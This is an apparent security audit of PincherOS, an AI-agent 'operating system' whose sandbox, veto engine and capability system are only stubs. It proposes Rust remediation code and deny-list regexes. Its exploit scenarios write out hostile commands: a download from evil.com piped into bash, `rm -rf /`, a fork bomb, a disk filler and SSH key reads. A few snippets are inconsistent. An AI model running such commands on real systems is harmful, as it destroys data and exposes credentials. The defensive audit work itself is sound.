# PincherOS Security Architecture Audit

**Auditor:** Independent Security Architecture Review  
**Date:** June 2025  
**Version:** 0.1.0-alpha.3 (target)  
**Classification:** CONFIDENTIAL  
**Severity Scale:** Critical / High / Medium / Low / Informational

---

## Executive Summary

PincherOS is an early-stage AI agent "operating system" project with a **two-layer security model** comprising a deterministic Veto Engine and a bwrap+Landlock sandbox. This audit reveals that **the security architecture exists almost entirely as a design document and module declarations** — the vast majority of security-critical components are declared in `lib.rs` as `pub mod` stubs but have **no backing implementation files**. The existing code (reflex engine, embedder, types) contains numerous security vulnerabilities, architectural flaws, and anti-patterns that would make it unsuitable for any production deployment.

### Key Findings at a Glance

| # | Finding | Severity | Status |
|---|---------|----------|--------|
| 1 | All security modules (veto, sandbox, capability, migration, RPC, sidecar) are **declared but unimplemented** | **CRITICAL** | Gap |
| 2 | Reflex engine executes shell commands with **no input validation** | **CRITICAL** | Vuln |
| 3 | `ReflexAction::Custom` enables arbitrary command execution | **CRITICAL** | Vuln |
| 4 | `Custom` action accepts arbitrary JSON parameters — command injection vector | **CRITICAL** | Vuln |
| 5 | No capability-based access control is implemented | **CRITICAL** | Gap |
| 6 | Sandbox is entirely absent — commands run with host privileges | **CRITICAL** | Gap |
| 7 | SQLite database stores patterns with **no encryption or integrity protection** | **HIGH** | Vuln |
| 8 | `cosine_similarity` produces NaN on zero vectors — potential DoS | **HIGH** | Vuln |
| 9 | Cache uses `unsafe impl Send/Sync` with no justification | **HIGH** | Vuln |
| 10 | Regex patterns in deny lists are not anchored — trivial bypass | **HIGH** | Vuln |
| 11 | No rate limiting on reflex execution | **MEDIUM** | Gap |
| 12 | `uuid::Uuid::nil()` fallback on parse failure — silent data corruption | **MEDIUM** | Vuln |
| 13 | `process_batch` has no parallelism — trivial DoS via large batches | **MEDIUM** | Vuln |
| 14 | No audit logging of security-relevant events | **MEDIUM** | Gap |
| 15 | Dependency `ring` v0.17 is acceptable; `rusqlite` bundled mode increases attack surface | **LOW** | Risk |

### Overall Security Posture: **CRITICALLY DEFICIENT**

The current codebase represents an **alpha prototype with no security boundaries**. An AI agent running on this system would have full access to the host system with no sandboxing, no command filtering, no capability enforcement, and no audit trail. **This system must not be used to execute untrusted or AI-generated code in any environment.**

---

## 1. Veto Engine Completeness

### 1.1 Current State: Complete Absence

**Finding:** The Veto Engine — described as the "deterministic rules layer that blocks dangerous patterns before execution" — is **entirely absent**. The module is declared in `pincher-core/src/lib.rs`:

```rust
pub mod security;
pub mod dynamics;
```

Neither `pincher-core/src/security/` nor `pincher-core/src/dynamics/` directories exist. There are **zero lines of veto code**.

**Severity:** CRITICAL (CVSS: 10.0)  
**CWE-693:** Protection Mechanism Failure  
**Exploit Scenario:** An AI agent generates a reflex action like `rm -rf /` or `curl https://evil.com | bash`. With no veto engine, this executes directly on the host with no interception.

### 1.2 What a Veto Engine MUST Block

A production veto engine for an AI agent OS must block, at minimum:

| Category | Examples | Status |
|----------|----------|--------|
| Destructive filesystem operations | `rm -rf`, `mkfs`, `dd if=/dev/zero of=/dev/sda` | **MISSING** |
| Privilege escalation | `sudo`, `su`, `setuid` binaries, `pkexec` | **MISSING** |
| Network exfiltration | `curl`, `wget`, `nc`, `scp`, `rsync` to external hosts | **MISSING** |
| Shell metacharacter injection | backticks, `$()`, `;`, `\|\|`, `&&` | **MISSING** |
| Environment variable attacks | `${IFS}`, `$PATH` manipulation | **MISSING** |
| Path traversal | `../`, symlink attacks, `/proc/self/` | **MISSING** |
| Unicode normalization attacks | homoglyphs, bidirectional override | **MISSING** |
| Polyglot injection | `python3 -c '...'` inside shell, `bash -c` nesting | **MISSING** |
| Fork/resource bombs | `:(){ :\|:& };:`, `yes`, memory allocators | **MISSING** |
| Credential access | `cat ~/.ssh/id_rsa`, `env`, `/proc/*/environ` | **MISSING** |

### 1.3 Command Injection Vectors in Current Code

The `ReflexAction::Custom` variant is a critical vulnerability:

```rust
// types.rs:107
Custom {
    handler: String,  // This is a COMMAND STRING
    params: HashMap<String, serde_json::Value>,  // Untrusted AI-generated parameters
},
```

The reflex engine's `match_event` serializes the entire event payload to a string and performs substring matching:

```rust
// matcher.rs:59
let event_text = format!("{} {}", event.event_type, event.payload);
```

This means a crafted payload like:
```json
{"message": "safe_cmd; rm -rf /"}
```
would match against triggers AND the `handler` string would be passed to the OS with **no validation whatsoever**.

### 1.4 TOCTOU Vulnerabilities

The `match_event` function uses a read lock:

```rust
// matcher.rs:57-58 (conceptual — patterns could mutate during match)
let matcher = self.matcher.read().await;
let mut results = matcher.match_event(event);
```

While the lock is held, if any mutable operation were allowed (it's not in current code), a TOCTOU could occur. More critically, **there is no atomic check-then-execute** in the action execution path — even if a veto engine existed, there would be a window between veto check and command execution where the filesystem or environment could change.

### 1.5 Unicode Normalization Attack Surface

```rust
// matcher.rs:70
if event_text.contains(trigger) {
```

Rust's `String::contains` operates on UTF-8 byte sequences. An attacker could use:
- **Unicode homoglyphs**: Cyrillic `а` (U+0430) vs Latin `a` (U+0061) to bypass trigger matching
- **Bidirectional override characters**: U+202E, U+202D to reorder displayed vs executed text
- **Normalization differences**: NFC vs NFD forms bypassing exact string comparisons

**Remediation — Implement a production Veto Engine:**

```rust
// pincher-core/src/security/veto.rs
use regex::Regex;
use once_cell::sync::Lazy;

/// Severity classification for a blocked command.
pub enum VetoSeverity {
    Critical,  // Always block, alert
    High,      // Always block
    Medium,    // Block unless explicitly allowed
    Low,       // Log but allow
}

/// Result of veto analysis.
pub enum VetoResult {
    Allow,
    Block { reason: String, severity: VetoSeverity },
    RequireApproval { reason: String },
}

static DANGEROUS_PATTERNS: Lazy<Vec<Regex>> = Lazy::new(|| {
    vec![
        // Destructive filesystem
        Regex::new(r"(?i)\brm\s+-[a-zA-Z]*f").unwrap(),
        Regex::new(r"(?i)\bmkfs\.").unwrap(),
        Regex::new(r"(?i)\bdd\s+if=").unwrap(),
        Regex::new(r">\s*/dev/[sh]d[a-z]").unwrap(),
        
        // Privilege escalation
        Regex::new(r"(?i)\bsudo\b").unwrap(),
        Regex::new(r"(?i)\bsu\s+-").unwrap(),
        Regex::new(r"(?i)\bpkexec\b").unwrap(),
        
        // Shell metacharacters
        Regex::new(r"[;\|&`$(){}[\]\\<>!*?~\"']").unwrap(),
        
        // Network tools
        Regex::new(r"(?i)\b(curl|wget|nc|netcat|scp|sftp|rsync|ssh)\b").unwrap(),
        
        // Path traversal
        Regex::new(r"\.\./|/\.\./|/~|/proc/self|/etc/passwd|/etc/shadow").unwrap(),
        
        // Credential access
        Regex::new(r"(?i)id_rsa|id_dsa|id_ecdsa|\.ssh|\.aws|\.kube/config|env\b").unwrap(),
        
        // Unicode attack indicators
        Regex::new(r"[\u{202E}\u{202D}\u{200E}\u{200F}]").unwrap(), // Bidi override
    ]
});

/// Normalize input to prevent Unicode bypass attacks.
fn normalize_input(input: &str) -> String {
    use unicode_normalization::UnicodeNormalization;
    input.nfc().collect::<String>()
        .replace(|c: char| c.is_control(), "")  // Strip control chars
        .replace(|c: char| is_homoglyph(c), "") // Strip confusables
}

fn is_homoglyph(c: char) -> bool {
    // Map Cyrillic and other confusable characters
    matches!(c, '\u{0430}'..='\u{044f}' | '\u{0410}'..='\u{042f}')
}

pub fn evaluate_command(cmd: &str) -> VetoResult {
    let normalized = normalize_input(cmd);
    
    for pattern in DANGEROUS_PATTERNS.iter() {
        if pattern.is_match(&normalized) {
            return VetoResult::Block {
                reason: format!("Matched forbidden pattern: {}", pattern.as_str()),
                severity: VetoSeverity::Critical,
            };
        }
    }
    
    // Check for polyglot injection (e.g., "python3 -c '...'" inside bash)
    if normalized.contains("python") || normalized.contains("ruby") || normalized.contains("perl") {
        return VetoResult::RequireApproval {
            reason: "Interpreter invocation requires approval".into(),
        };
    }
    
    VetoResult::Allow
}
```

---

## 2. Sandbox Effectiveness

### 2.1 Current State: Complete Absence

**Finding:** The sandbox — described as using "bwrap + landlock" — is **entirely absent**. No `pincher-core/src/sandbox/` directory exists. No `bwrap.rs` file exists. The `SandboxConfig` type in `types.rs` is purely declarative with zero enforcement code.

**Severity:** CRITICAL (CVSS: 10.0)  
**CWE-693:** Protection Mechanism Failure  
**Exploit Scenario:** Any reflex action, including `ReflexAction::Custom` with arbitrary shell commands, executes with the **full privileges of the PincherOS process**, including access to the entire filesystem, network, environment variables with secrets, and other processes.

### 2.2 SandboxConfig Analysis (Types Only)

```rust
// types.rs:145-166
pub struct SandboxConfig {
    pub enabled: bool,
    pub read_only_paths: Vec<String>,
    pub read_write_paths: Vec<String>,
    pub network_allowed: bool,
    pub max_processes: usize,
    pub uid_map: Option<String>,
}
```

**Issues:**

1. **`enabled: bool`** — Security features should NEVER be optional booleans. This is an "insecure by default" anti-pattern.
2. **`read_only_paths` includes `/lib`, `/usr`** — On a modern system, these are often symlinks or may not exist in containerized deployments.
3. **No `no_new_privs` flag** — Missing critical privilege-dropping mechanism.
4. **No seccomp profile** — No syscall filtering at all.
5. **No cgroup configuration** — No resource limits enforced.
6. **No `tmpfs` mounts** — Writable paths share host filesystem.
7. **`uid_map: Option<String>`** — Using a string instead of structured UID/GID mapping is fragile.

### 2.3 Required Sandbox Implementation

A production sandbox MUST implement ALL of the following:

```rust
// pincher-core/src/sandbox/bwrap.rs
use std::process::{Command, Stdio};
use nix::unistd::{Uid, Gid};

/// Full sandbox configuration with NO optional security features.
pub struct Sandbox {
    rootfs: PathBuf,          // New root via pivot_root
    uid: Uid,                 // Mapped UID inside sandbox
    gid: Gid,                 // Mapped GID inside sandbox
    ro_binds: Vec<PathBuf>,   // Read-only bind mounts
    rw_binds: Vec<PathBuf>,   // Read-write bind mounts
    tmpfs_dirs: Vec<PathBuf>, // Private tmpfs mounts
    network: NetworkPolicy,
    seccomp_profile: SeccompProfile,
    landlock_ruleset: LandlockRuleset,
    cgroup_limits: CgroupLimits,
    no_new_privs: bool,       // Always true
    die_with_parent: bool,    // Always true
}

impl Sandbox {
    pub fn execute(&self, cmd: &[String]) -> Result<Child, SandboxError> {
        // 1. Create new user namespace
        // 2. Create new mount namespace  
        // 3. Create new PID namespace
        // 4. Create new IPC namespace
        // 5. Create new UTS namespace
        // 6. Create new network namespace (or restricted)
        // 7. Set up Landlock filesystem rules
        // 8. Apply seccomp-BPF filter
        // 9. Set up cgroups for resource limits
        // 10. pivot_root into minimal rootfs
        // 11. Drop capabilities (keep NONE)
        // 12. Execute command
        todo!("Full sandbox implementation required")
    }
}
```

### 2.4 bwrap Configuration Review

If bubblewrap were actually used, the correct invocation would be:

```bash
bwrap \
  --new-session \
  --unshare-all \
  --share-net "" \
  --die-with-parent \
  --clearenv \
  --setenv PATH /usr/bin:/bin \
  --ro-bind /usr /usr \
  --ro-bind /lib /lib \
  --ro-bind /lib64 /lib64 \
  --ro-bind /bin /bin \
  --ro-bind /sbin /sbin \
  --dir /tmp \
  --tmpfs /tmp \
  --proc /proc \
  --dev /dev \
  --chdir /tmp \
  --uid 65534 \
  --gid 65534 \
  --cap-drop ALL \
  --seccomp 10 \\
  <command>
```

**Critical bwrap flags missing from any design:**

| Flag | Purpose | Risk if Missing |
|------|---------|-----------------|
| `--new-session` | New session, prevents TTY hijacking | Terminal escape |
| `--die-with-parent` | Auto-kill when parent exits | Orphaned processes |
| `--clearenv` | Clear all environment variables | Secret leakage |
| `--cap-drop ALL` | Drop all Linux capabilities | Capability escalation |
| `--seccomp N` | Read seccomp filter from fd N | Arbitrary syscalls |

### 2.5 Landlock LSM Best Practices

Per the [official Landlock documentation](https://docs.kernel.org/userspace-api/landlock.html), the filesystem policy should:

```rust
// Landlock implementation using rust-landlock or raw syscalls
use landlock::{ABI, AccessFs, PathFd, PathBeneath, Ruleset, RulesetStatus};

pub fn setup_landlock(read_paths: &[&str], write_paths: &[&str]) -> Result<()> {
    let abi = ABI::V5;
    let mut ruleset = Ruleset::new()
        .set_compatibility(CompatLevel::HardRequirement)
        .handle_access(AccessFs::from_all(abi))?;
    
    // Read-only paths
    for path in read_paths {
        let ro = PathBeneath::new(
            PathFd::new(path)?,
            AccessFs::ReadDir | AccessFs::ReadFile | AccessFs::Refer,
        );
        ruleset.add_rule(ro)?;
    }
    
    // Read-write paths
    for path in write_paths {
        let rw = PathBeneath::new(
            PathFd::new(path)?,
            AccessFs::from_all(abi),
        );
        ruleset.add_rule(rw)?;
    }
    
    // Default deny — restrict everything else
    let status = ruleset.restrict_self()?;
    assert_eq!(status, RulesetStatus::FullyEnforced);
    
    Ok(())
}
```

**Key Landlock principles:**
- Access is **denied by default** — any path not explicitly allowed is inaccessible
- Multiple rulesets can be **layered** for defense in depth
- A sandboxed thread can **further restrict itself** but never relax restrictions
- `AccessFs::Refer` is required for renaming/linking between directories

### 2.6 Namespace Isolation Quality Assessment

| Namespace | Required | Current | Risk |
|-----------|----------|---------|------|
| User (userns) | YES | **ABSENT** | Full root privileges |
| Mount (mntns) | YES | **ABSENT** | Full filesystem access |
| PID (pidns) | YES | **ABSENT** | Can see/kill other processes |
| Network (netns) | YES | **ABSENT** | Full network access |
| IPC (ipcns) | YES | **ABSENT** | Shared memory attacks |
| UTS (utsns) | Optional | **ABSENT** | Hostname disclosure |
| CGroup (cgroupns) | YES | **ABSENT** | Escape via cgroup v1 |

---

## 3. Capability System

### 3.1 Current State: Type Stub Only

The `Capability` type in `types.rs` is a plain data structure:

```rust
pub struct Capability {
    pub name: String,
    pub version: String,
    pub permissions: Vec<String>,
}
```

**No `pincher-core/src/capability/` directory exists.** There is zero implementation of:
- Capability token issuance and validation
- Delegation chains
- Revocation mechanisms
- Manifest verification
- Least-privilege enforcement

**Severity:** CRITICAL (CVSS: 9.8)  
**CWE-269:** Improper Privilege Management

### 3.2 What's Missing

A production capability system must implement:

```rust
/// Cryptographic capability token.
/// 
/// Format: cap_<agent_id>_<resource>_<expiry>_<signature>
/// Signed with the daemon's Ed25519 key.
pub struct CapabilityToken {
    pub issuer: AgentId,          // Who granted this capability
    pub subject: AgentId,         // Who can use it
    pub resource: ResourcePath,   // What it grants access to
    pub rights: BitFlags<Right>,  // Read, Write, Execute, Delegate
    pub not_before: Timestamp,
    pub not_after: Timestamp,
    pub nonce: [u8; 16],          // Prevents replay
    pub signature: Ed25519Signature,
}

/// Delegation chain — capabilities can be delegated up to MAX_DEPTH.
pub struct DelegationChain {
    pub root: CapabilityToken,     // Original grant
    pub delegations: Vec<CapabilityToken>, // Chain of delegations
}

/// Capability verification errors.
pub enum CapVerifyError {
    Expired,
    NotYetValid,
    InvalidSignature,
    Revoked,
    DelegationTooDeep,
    ResourceMismatch,
}
```

### 3.3 Privilege Escalation Vectors (With Current Stub)

Since the capability system doesn't exist:

1. **Any agent can perform any action** — there's no authorization check
2. **No delegation limits** — an agent could theoretically grant itself unlimited permissions
3. **No revocation** — once a capability is conceptually granted, it cannot be taken away
4. **No expiry** — capabilities are eternal
5. **No audit trail** — no record of who granted what to whom

**Remediation:**

```rust
impl CapabilityToken {
    /// Verify a capability token with full chain validation.
    pub fn verify(
        &self,
        delegations: &[CapabilityToken],
        request: &ResourceRequest,
        now: Timestamp,
        revoked: &RevocationSet,
        root_key: &Ed25519PublicKey,
    ) -> Result<(), CapVerifyError> {
        // 1. Check temporal validity
        if now < self.not_before {
            return Err(CapVerifyError::NotYetValid);
        }
        if now > self.not_after {
            return Err(CapVerifyError::Expired);
        }
        
        // 2. Check revocation
        if revoked.contains(self.nonce) {
            return Err(CapVerifyError::Revoked);
        }
        
        // 3. Verify delegation depth
        if delegations.len() > MAX_DELEGATION_DEPTH {
            return Err(CapVerifyError::DelegationTooDeep);
        }
        
        // 4. Verify chain signatures
        let mut current_key = root_key;
        for (i, cap) in delegations.iter().enumerate() {
            cap.verify_signature(current_key)
                .map_err(|_| CapVerifyError::InvalidSignature)?;
            
            // Each delegation must grant Delegate right
            if !cap.rights.contains(Right::Delegate) && i < delegations.len() - 1 {
                return Err(CapVerifyError::InvalidDelegation);
            }
            
            current_key = &cap.subject_key;
        }
        
        // 5. Verify final capability signature
        self.verify_signature(current_key)?;
        
        // 6. Check resource scope (must be subresource)
        if !self.resource.covers(&request.resource) {
            return Err(CapVerifyError::ResourceMismatch);
        }
        
        // 7. Check rights are sufficient
        if !self.rights.contains(request.required_right) {
            return Err(CapVerifyError::InsufficientRights);
        }
        
        Ok(())
    }
}
```

---

## 4. Supply Chain Security

### 4.1 Dependency Analysis (Cargo.toml)

**No `Cargo.lock` file exists** — builds are non-reproducible, enabling supply chain attacks via dependency confusion or malicious updates.

| Dependency | Version | Risk Assessment |
|------------|---------|-----------------|
| `tokio` | 1.35 | Acceptable — widely audited, but `features = ["full"]` increases attack surface |
| `serde` / `serde_json` | 1.0 | Acceptable — stable, widely used |
| `rusqlite` | 0.30 with `bundled` | **HIGH RISK** — bundles SQLite, increasing binary size and attack surface; prevents system security updates |
| `ort` | 2.0.0-rc.2 | **HIGH RISK** — release candidate, not production ready; loads arbitrary ONNX models |
| `ring` | 0.17 | Acceptable — Rustls crypto, well-audited |
| `blake3` | 1.5 | Acceptable — fast, cryptographically secure |
| `reqwest` | 0.11 | Optional — if enabled, enables outbound network from core |
| `nix` | 0.27 | Acceptable — needed for namespaces, but version 0.27 is current |
| `tarpc` | 0.34 | Optional — RPC framework, review needed if enabled |
| `x509-parser` | 0.16 | Acceptable — for certificate parsing |
| `regex` | 1.10 | Acceptable — Rust regex engine (safe), not backtracking |
| `tempfile` | 3.9 | Acceptable — secure temp file creation |
| `walkdir` | 2.4 | Acceptable — filesystem traversal |

### 4.2 Missing Security Dependencies

The following SHOULD be included for a security-focused project:

| Missing Dependency | Purpose |
|-------------------|---------|
| `rust-landlock` | Landlock LSM bindings |
| `libseccomp` / `seccomp-sys` | Seccomp-BPF filtering |
| `caps` | Linux capability manipulation |
| `cgroups-rs` | Cgroup v2 resource control |
| `ed25519-dalek` | Capability token signing |
| `zeroize` | Secure memory wiping for secrets |
| `secrecy` | Wrapper type for secret values |
| `constant_time_eq` | Constant-time comparison |
| `cargo-audit` | CI dependency vulnerability scanning |
| `cargo-deny` | License and advisory checking |

### 4.3 Python Sidecar (pincher-infer/)

**The `pincher-infer/` directory does not exist.** There is no Python sidecar. The ONNX inference module (`embed/onnx.rs`) is a stub with a placeholder `session: Option<()>`.

**If a Python sidecar were added, it would need:**
- Its own sandbox (same as the main agent sandbox)
- Model signature verification before loading
- Restricted network access (for model downloads only)
- Memory-safe IPC (no pickle, no raw shared memory)
- Input sanitization (Python pickle is a remote code execution vector)

### 4.4 Model Download and Verification

**No model download mechanism exists.** When implemented, models must be:
1. Downloaded over HTTPS with certificate pinning
2. Verified with BLAKE3 checksum against a signed manifest
3. Stored with restricted permissions (0600)
4. Quarantined until verification passes

---

## 5. Sidecar RPC Security

### 5.1 Current State: Complete Absence

**No `pincher-core/src/rpc/` directory exists.**  
**No `pincher-core/src/sidecar.rs` file exists.**

The `RpcRequest` and `RpcResponse` types in `types.rs` are bare JSON-RPC envelopes with **no authentication, no encryption, no integrity protection**:

```rust
pub struct RpcRequest {
    pub id: Uuid,
    pub method: String,
    pub params: serde_json::Value,
}

pub struct RpcResponse {
    pub id: Uuid,
    pub result: Option<serde_json::Value>,
    pub error: Option<String>,
}
```

### 5.2 Threat Model for RPC

When implemented, the RPC between core and sidecar faces these threats:

| Threat | Severity | Mitigation |
|--------|----------|------------|
| Local attacker connects to Unix socket | HIGH | Filesystem permissions (0600), peer credential verification |
| Man-in-the-middle on shared socket | HIGH | Each message signed with HMAC-SHA256 |
| Replay attack | HIGH | Include monotonic counter/nonce in each message |
| Sidecar compromise spreads to core | CRITICAL | Strict input validation, capability limits, seccomp on sidecar |
| Denial of service via slow responses | MEDIUM | Timeout enforcement, request quotas |
| Information leakage via error messages | MEDIUM | Sanitize all error messages before returning |

### 5.3 Required RPC Security Architecture

```rust
/// Authenticated RPC message envelope.
pub struct SecureRpcRequest {
    pub inner: RpcRequest,
    pub timestamp: u64,              // Unix timestamp (prevent replay)
    pub nonce: [u8; 16],            // Unique per-request
    pub hmac: [u8; 32],             // HMAC-SHA256 over serialized (inner + timestamp + nonce)
}

/// Verify the RPC message came from the authenticated peer.
fn verify_rpc_peer(stream: &UnixStream) -> Result<PeerIdentity> {
    // Get peer credentials via SO_PEERCRED
    let creds = stream.peer_cred()?;
    
    // Verify UID is the expected sidecar user
    if creds.uid() != expected_sidecar_uid() {
        return Err(RpcError::Unauthorized);
    }
    
    // Verify PID exists and matches known sidecar
    let peer_pid = creds.pid();
    if !is_known_sidecar_process(peer_pid) {
        return Err(RpcError::UnknownPeer);
    }
    
    Ok(PeerIdentity { uid: creds.uid(), pid: peer_pid })
}
```

---

## 6. Migration Security (.nail files)

### 6.1 Current State: Complete Absence

**No `pincher-core/src/migration/` directory exists.**

The `PackManifest` type in `types.rs` declares a checksum field:

```rust
pub struct PackManifest {
    pub version: String,
    pub agent_id: AgentId,
    pub created_at: chrono::DateTime<chrono::Utc>,
    pub checksum: String,  // BLAKE3 — but NO verification code exists
    pub files: Vec<String>,
}
```

### 6.2 Threats Against .nail Files

| Threat | Severity | Description |
|--------|----------|-------------|
| Tampered manifest | CRITICAL | Attacker modifies manifest to change checksums or files |
| Malicious file paths | CRITICAL | `../../etc/cron.d/backdoor` in files list |
| Zip bomb / decompression bomb | HIGH | Compressed .nail file expands to fill disk |
| Signature bypass | HIGH | No cryptographic signature on manifest |
| Rollback attack | MEDIUM | Older, vulnerable agent state restored |
| Metadata leakage | MEDIUM | Sensitive data in unencrypted migration package |

### 6.3 Required Migration Security

```rust
use blake3::Hasher;
use ed25519_dalek::{Signer, Verifier, Signature, PublicKey};

/// Signed and integrity-protected migration package.
pub struct SecurePack {
    pub manifest: PackManifest,
    pub file_hashes: HashMap<String, [u8; 32]>, // BLAKE3 per file
    pub manifest_signature: Signature,           // Ed25519 signature
}

impl SecurePack {
    /// Verify the entire pack before extraction.
    pub fn verify(&self, public_key: &PublicKey) -> Result<(), MigrationError> {
        // 1. Verify manifest signature
        let manifest_bytes = serde_json::to_vec(&self.manifest)?;
        public_key.verify(&manifest_bytes, &self.manifest_signature)
            .map_err(|_| MigrationError::InvalidSignature)?;
        
        // 2. Verify version freshness (prevent rollback)
        if self.manifest.created_at < minimum_acceptable_timestamp() {
            return Err(MigrationError::TooOld);
        }
        
        // 3. Validate all file paths are relative and safe
        for path in &self.manifest.files {
            if path.starts_with('/') || path.contains("..") {
                return Err(MigrationError::PathTraversalBlocked);
            }
            if path.len() > MAX_PATH_LENGTH {
                return Err(MigrationError::PathTooLong);
            }
            // Check for symlink targets
            let canonical = std::fs::canonicalize(path)?;
            if !canonical.starts_with(sandbox_root()) {
                return Err(MigrationError::EscapeAttempt);
            }
        }
        
        // 4. Verify file count within limits (zip bomb protection)
        if self.manifest.files.len() > MAX_FILES_PER_PACK {
            return Err(MigrationError::TooManyFiles);
        }
        
        Ok(())
    }
    
    /// Extract with integrity verification.
    pub fn extract_verified(&self, dest: &Path) -> Result<()> {
        for file in &self.manifest.files {
            let expected_hash = self.file_hashes.get(file)
                .ok_or(MigrationError::MissingHash)?;
            
            let content = std::fs::read(dest.join(file))?;
            let actual_hash = blake3::hash(&content);
            
            if actual_hash.as_bytes() != expected_hash {
                return Err(MigrationError::IntegrityFailure);
            }
        }
        Ok(())
    }
}
```

---

## 7. Denial of Service Vectors

### 7.1 Resource Exhaustion Through Reflex Execution

The reflex engine has **no resource limits** on any operation:

```rust
// matcher.rs:57
pub fn match_event(&self, event: &ReflexEvent) -> Vec<MatchResult> {
    // O(n * m) where n = patterns, m = triggers
    // NO LIMIT on pattern count
    // NO TIMEOUT on matching
    // NO MEMORY LIMIT on results Vec
```

**Attack:** Register 1 million patterns, then trigger matching. Each match allocates a `MatchResult` with multiple `String` allocations.

### 7.2 Fork Bombs

With no sandbox and no `RLIMIT_NPROC`, a reflex action like:
```bash
:(){ :|:& };:
```
would create unlimited processes, crashing the host.

### 7.3 Disk Filling Attacks

A `ReflexAction::Custom` handler can write arbitrary files. With no disk quotas:
```bash
dd if=/dev/urandom of=/tmp/fill bs=1M
```
will fill the disk until the system fails.

### 7.4 Cache Poisoning / Memory Exhaustion

The `ReflexCache` has hardcoded capacity but creates a key from the full event:

```rust
// cache.rs:35-40
fn make_key(event: &ReflexEvent) -> String {
    format!("{}:{}:{}", event.source, event.event_type, event.payload)
    // payload can be arbitrarily large JSON!
}
```

An attacker can send events with multi-megabyte payloads, causing:
- Excessive key memory usage
- HashMap growth beyond capacity
- Potential OOM

### 7.5 Batch Processing DoS

```rust
// engine.rs:79-88
pub async fn process_batch(&self, events: Vec<ReflexEvent>) -> Vec<Vec<MatchResult>> {
    let mut all_results = Vec::with_capacity(events.len());
    for event in events {  // NO MAX BATCH SIZE
        let results = self.process_event(&event).await;  // NO TIMEOUT
        all_results.push(results);
    }
    all_results  // Accumulates ALL results in memory
}
```

**Attack:** Send a batch of 1 million events. Each produces match results. Memory grows without bound.

### 7.6 CPU Exhaustion via Regex

The `regex` crate is safe (no catastrophic backtracking), but if a `ReflexAction::Custom` handler uses a backtracking regex engine (Python `re`, Ruby, etc.), ReDoS is possible.

### 7.7 Remediation: Resource Limits

```rust
pub struct ResourceGuard {
    // Process limits
    max_pids: u64,           // RLIMIT_NPROC
    max_memory: u64,         // RLIMIT_AS + cgroup memory.max
    max_cpu_time: u64,       // RLIMIT_CPU
    max_file_size: u64,      // RLIMIT_FSIZE
    max_open_files: u64,     // RLIMIT_NOFILE
    
    // Reflex engine limits
    max_patterns: usize,     // Per-agent pattern limit
    max_triggers_per_pattern: usize,
    max_event_size: usize,   // JSON payload limit
    max_batch_size: usize,   // Events per batch
    match_timeout: Duration, // Per-match time limit
    
    // Rate limiting
    max_events_per_second: f64,
    max_commands_per_minute: f64,
}

impl ResourceGuard {
    pub fn apply(&self) -> Result<()> {
        // Set all rlimits
        setrlimit(Resource::NPROC, self.max_pids, self.max_pids)?;
        setrlimit(Resource::AS, self.max_memory, self.max_memory)?;
        setrlimit(Resource::CPU, self.max_cpu_time, self.max_cpu_time)?;
        setrlimit(Resource::FSIZE, self.max_file_size, self.max_file_size)?;
        setrlimit(Resource::NOFILE, self.max_open_files, self.max_open_files)?;
        
        // Setup cgroup v2 limits
        setup_cgroup_limits(self)?;
        
        Ok(())
    }
}
```

---

## 8. Specific Code Vulnerability Details

### 8.1 V-001: Unsafe Send/Sync on ReflexCache (CVSS: 7.5 HIGH)

**Location:** `reflex/cache.rs:95-96`

```rust
unsafe impl Send for ReflexCache {}
unsafe impl Sync for ReflexCache {}
```

**Issue:** The `ReflexCache` contains `HashMap` and `VecDeque` which are already `Send + Sync`. These `unsafe impl` blocks are unnecessary and dangerous — they bypass the compiler's safety analysis. If the type is later modified to include non-Send/Sync fields, this will create undefined behavior.

**Remediation:** Remove both lines. `HashMap<String, Vec<MatchResult>>` and `VecDeque<String>` are already `Send + Sync`.

### 8.2 V-002: NaN in Cosine Similarity (CVSS: 6.5 MEDIUM)

**Location:** `embed/mod.rs:42-47`

```rust
pub fn cosine_similarity(a: &[f32], b: &[f32]) -> f32 {
    let dot: f32 = a.iter().zip(b.iter()).map(|(x, y)| x * y).sum();
    let norm_a: f32 = a.iter().map(|x| x * x).sum::<f32>().sqrt();
    let norm_b: f32 = b.iter().map(|x| x * x).sum::<f32>().sqrt();
    dot / (norm_a * norm_b)  // NaN when either vector is all zeros
}
```

**Issue:** If either vector is all zeros, `norm_a` or `norm_b` is 0.0, producing `NaN`. This can propagate through the system and cause logic errors.

**Remediation:**
```rust
pub fn cosine_similarity(a: &[f32], b: &[f32]) -> Option<f32> {
    if a.len() != b.len() {
        return None;
    }
    let dot: f32 = a.iter().zip(b.iter()).map(|(x, y)| x * y).sum();
    let norm_a: f32 = a.iter().map(|x| x * x).sum::<f32>().sqrt();
    let norm_b: f32 = b.iter().map(|x| x * x).sum::<f32>().sqrt();
    
    if norm_a == 0.0 || norm_b == 0.0 {
        return None;  // Zero vector has no direction
    }
    
    Some(dot / (norm_a * norm_b))
}
```

### 8.3 V-003: Uuid::nil() Fallback on Parse Failure (CVSS: 5.5 MEDIUM)

**Location:** `reflex/gastrolith.rs:86`

```rust
id: crate::types::ReflexId(
    uuid::Uuid::parse_str(&id_str).unwrap_or_else(|_| uuid::Uuid::nil()),
),
```

**Issue:** On UUID parse failure, falls back to `Uuid::nil()` (all zeros). This means multiple corrupted database entries will share the same ID, causing pattern collisions and data loss.

**Remediation:** Return an error instead:
```rust
id: crate::types::ReflexId(
    uuid::Uuid::parse_str(&id_str)
        .map_err(|e| rusqlite::Error::FromSql {
            err: format!("Invalid UUID in database: {}", e).into(),
            column: 0,
            from: "TEXT".into(),
        })?,
),
```

### 8.4 V-004: Write Lock Used for Read-Only Operation (CVSS: 5.3 MEDIUM)

**Location:** `reflex/orchestrator.rs:49-64`

```rust
pub async fn route_event(&self, agent_id: AgentId, event: ReflexEvent) -> Vec<MatchResult> {
    let mut engines = self.engines.write().await; // Should be read lock!
    let engine = engines.get(&agent_id)
        .cloned()
        .unwrap_or_else(|| self.global_engine.clone());
    drop(engines);
    engine.process_event(&event).await
}
```

**Issue:** Uses `write()` lock for a read-only lookup. Under high load, this serializes ALL event processing across ALL agents — a severe concurrency bottleneck and potential DoS vector.

**Remediation:**
```rust
let engines = self.engines.read().await; // Read lock is sufficient
```

### 8.5 V-005: Cache Key Includes Timestamp (CVSS: 4.0 LOW)

**Location:** `reflex/cache.rs:35-40`

```rust
fn make_key(event: &ReflexEvent) -> String {
    format!("{}:{}:{}", event.source, event.event_type, event.payload)
    // BUG: Timestamp is NOT included but the comment says it is
}
```

